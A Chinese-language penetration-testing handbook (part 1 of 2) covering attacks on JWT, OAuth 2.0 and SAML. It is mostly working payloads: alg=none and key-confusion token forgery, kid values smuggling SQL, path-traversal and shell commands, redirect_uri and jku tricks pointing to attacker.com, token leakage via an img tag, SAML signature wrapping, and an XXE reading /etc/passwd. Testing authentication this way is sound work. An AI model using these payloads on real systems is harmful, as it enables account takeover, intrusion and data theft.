# oauth-jwt-test · part 1

> 分段 1/2。完整索引见 `oauth-jwt-test.md`。

## 一、原有知识库

# OAuth/JWT/SAML 安全测试手册
## 一、JWT 测试

### 1.1 算法混淆攻击

```python
import jwt
import base64

# 原始 JWT
token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature"

# 攻击 1: alg=none（去除签名）
header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin"}
fake_token = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=') + '.' + \
             base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=') + '.'

# 攻击 2: RS256 → HS256（用公钥作为 HMAC 密钥）
# 1. 获取公钥（从 /jwks.json 或证书）
# 2. 用公钥作为 HS256 的密钥签名
public_key = open('public.pem', 'rb').read()
fake_token = jwt.encode({"user": "admin"}, public_key, algorithm='HS256')
```

### 1.2 密钥爆破

```bash
# jwt_tool 爆破
python3 jwt_tool.py <JWT> -C -d wordlist.txt

# hashcat 爆破
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# John the Ripper
john --wordlist=wordlist.txt --format=HMAC-SHA256 jwt.txt
```

### 1.3 kid 注入

```python
# kid (Key ID) 参数可能存在注入
# SQL 注入
header = {
    "alg": "HS256",
    "kid": "1' UNION SELECT 'secret'--"
}

# 路径遍历
header = {
    "alg": "HS256",
    "kid": "../../../../../../dev/null"  # 空文件作为密钥
}

# 命令注入
header = {
    "alg": "HS256",
    "kid": "key.txt; whoami"
}
```

### 1.4 jku/x5u 头部篡改

```python
# jku: JWK Set URL（指向攻击者服务器）
header = {
    "alg": "RS256",
    "jku": "https://attacker.com/jwks.json",
    "kid": "attacker-key"
}

# 攻击者服务器上的 jwks.json
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "attacker-key",
      "use": "sig",
      "n": "...",  # 攻击者的公钥
      "e": "AQAB"
    }
  ]
}

# 用攻击者私钥签名 JWT
```

### 1.5 exp 过期时间篡改

```python
import jwt
import time

# 修改 exp 为未来时间
payload = {
    "user": "admin",
    "exp": int(time.time()) + 86400 * 365  # 1年后过期
}

# 如果服务端不验证签名，直接修改 payload
```

### 1.6 签名剥离

```bash
# 去除签名部分，只保留 header.payload.
# 部分实现可能不检查签名是否存在

# 原始: eyJhbGci...header.eyJ1c2Vy...payload.c2lnbmF0dXJl...signature
# 修改: eyJhbGci...header.eyJ1c2Vy...payload.
```

---
## 二、OAuth 2.0 测试

### 2.1 redirect_uri 绕过

```bash
# 原始授权 URL
https://oauth.target.com/authorize?
  client_id=CLIENT_ID&
  redirect_uri=https://target.com/callback&
  response_type=code&
  scope=read

# 绕过方法 1: 子目录
redirect_uri=https://target.com/callback/../../attacker.com

# 绕过方法 2: 子域名
redirect_uri=https://attacker.target.com/callback

# 绕过方法 3: 参数污染
redirect_uri=https://target.com/callback?next=https://attacker.com

# 绕过方法 4: 开放重定向链
redirect_uri=https://target.com/redirect?url=https://attacker.com

# 绕过方法 5: 域名混淆
redirect_uri=https://target.com.attacker.com
redirect_uri=https://target.com@attacker.com
redirect_uri=https://target.com%2eattacker.com

# 绕过方法 6: 协议混淆
redirect_uri=javascript:alert(document.domain)
redirect_uri=data:text/html,<script>alert(1)</script>
```

### 2.2 state 参数测试

```bash
# 测试 1: state 参数缺失
# 去掉 state 参数，观察是否仍能完成授权 → CSRF 风险

# 测试 2: state 可预测
# 多次授权，观察 state 是否有规律（递增、时间戳等）

# 测试 3: state 重放
# 使用已用过的 state 再次授权
```

### 2.3 授权码重放

```bash
# 1. 完成一次授权，获取 code
# 2. 用 code 换取 access_token
# 3. 再次用同一 code 换取 token
# 如果成功 → 授权码可重放

curl -X POST "https://oauth.target.com/token" \
  -d "grant_type=authorization_code" \
  -d "code=USED_CODE" \
  -d "client_id=CLIENT_ID" \
  -d "client_secret=CLIENT_SECRET" \
  -d "redirect_uri=https://target.com/callback"
```

### 2.4 scope 提升

```bash
# 请求时 scope=read
# 授权后修改 code 换 token 时的 scope

curl -X POST "https://oauth.target.com/token" \
  -d "grant_type=authorization_code" \
  -d "code=AUTH_CODE" \
  -d "client_id=CLIENT_ID" \
  -d "client_secret=CLIENT_SECRET" \
  -d "redirect_uri=https://target.com/callback" \
  -d "scope=read write admin"  # 提升权限
```

### 2.5 隐式授权流 token 泄露

```bash
# Implicit Flow 直接在 URL fragment 返回 token
https://target.com/callback#access_token=TOKEN&token_type=Bearer

# 风险:
# 1. Referer 泄露（访问外部链接时）
# 2. 浏览器历史记录
# 3. 日志记录

# 测试: 在回调页面插入外部资源
<img src="https://attacker.com/log">
# 检查 attacker.com 日志是否收到 Referer 含 token
```

### 2.6 PKCE 缺失测试

```bash
# PKCE (Proof Key for Code Exchange) 用于防止授权码拦截

# 测试: 不发送 code_challenge 和 code_verifier
# 1. 授权时不带 code_challenge
# 2. 换 token 时不带 code_verifier
# 如果仍能成功 → 未强制 PKCE
```

### 2.7 client_secret 泄露

```bash
# 检查 JS 源码
grep -r "client_secret" *.js
grep -r "clientSecret" *.js

# 检查移动端 APK
apktool d app.apk
grep -r "client_secret" app/

# 检查 Git 历史
git log -p | grep -i "client_secret"
```

---
## 三、SAML 测试

### 3.1 签名绕过（XML 签名包装攻击）

```xml
<!-- 原始 SAML Response -->
<samlp:Response>
  <Assertion ID="original">
    <Subject>
      <NameID>victim@example.com</NameID>
    </Subject>
    <Signature>...</Signature>
  </Assertion>
</samlp:Response>

<!-- 攻击: 插入恶意 Assertion -->
<samlp:Response>
  <Assertion ID="evil">
    <Subject>
      <NameID>attacker@example.com</NameID>
    </Subject>
  </Assertion>
  <Assertion ID="original">
    <Subject>
      <NameID>victim@example.com</NameID>
    </Subject>
    <Signature>...</Signature>
  </Assertion>
</samlp:Response>

<!-- 如果应用读取第一个 Assertion 但验证第二个签名 → 绕过 -->
```

### 3.2 断言篡改

```xml
<!-- 修改 NameID -->
<NameID>admin@example.com</NameID>

<!-- 修改属性 -->
<Attribute Name="role">
  <AttributeValue>admin</AttributeValue>
</Attribute>

<!-- 修改过期时间 -->
<Conditions NotBefore="2020-01-01" NotOnOrAfter="2030-01-01">
```

### 3.3 XXE 注入

```xml
<!-- SAML 请求中注入 XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:AuthnRequest>
  <Issuer>&xxe;</Issuer>
</samlp:AuthnRequest>
```

### 3.4 注释注入截断

```xml
<!-- 利用 XML 注释截断签名验证 -->
<NameID>victim@example.com<!--</NameID>
<NameID>attacker@example.com</NameID>-->
```

---
## 四、测试工具

### jwt_tool

```bash
# 安装
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
python3 jwt_tool.py -h

# 扫描所有漏洞
python3 jwt_tool.py <JWT> -M at

# 爆破密钥
python3 jwt_tool.py <JWT> -C -d wordlist.txt

# 篡改 payload
python3 jwt_tool.py <JWT> -T
```

### Burp 插件

```
- JSON Web Tokens (JWT4B)
- SAML Raider
- OAuth Scanner
```

### Python 脚本示例

```python
import requests
import jwt

# JWT 测试
def test_jwt_none_alg(token):
    """测试 alg=none 攻击"""
    header, payload, sig = token.split('.')
    
    # 解码 payload
    import base64, json
    payload_data = json.loads(base64.urlsafe_b64decode(payload + '=='))
    
    # 构造 alg=none token
    new_header = base64.urlsafe_b64encode(
        json.dumps({"alg": "none", "typ": "JWT"}).encode()
    ).decode().rstrip('=')
    new_payload = base64.urlsafe_b64encode(
        json.dumps(payload_data).encode()
    ).decode().rstrip('=')
    
    fake_token = f"{new_header}.{new_payload}."
    
    # 测试
    r = requests.get("https://target.com/api/me",
                     headers={"Authorization": f"Bearer {fake_token}"})
    return r.status_code == 200

# OAuth redirect_uri 测试
def test_redirect_uri_bypass(auth_url, payloads):
    """测试 redirect_uri 绕过"""
    for payload in payloads:
        test_url = auth_url.replace(
            "redirect_uri=https://target.com/callback",
            f"redirect_uri={payload}"
        )
        print(f"测试: {payload}")
        # 手动访问 test_url 观察是否跳转到攻击者域名
```

---

> 本块超过 12KB，已拆分：后半部分见 [`oauth-jwt-test-p1-b.md`](oauth-jwt-test-p1-b.md)（从「二、补充：api-auth-and-jwt-abuse」起），按需只读该分段。
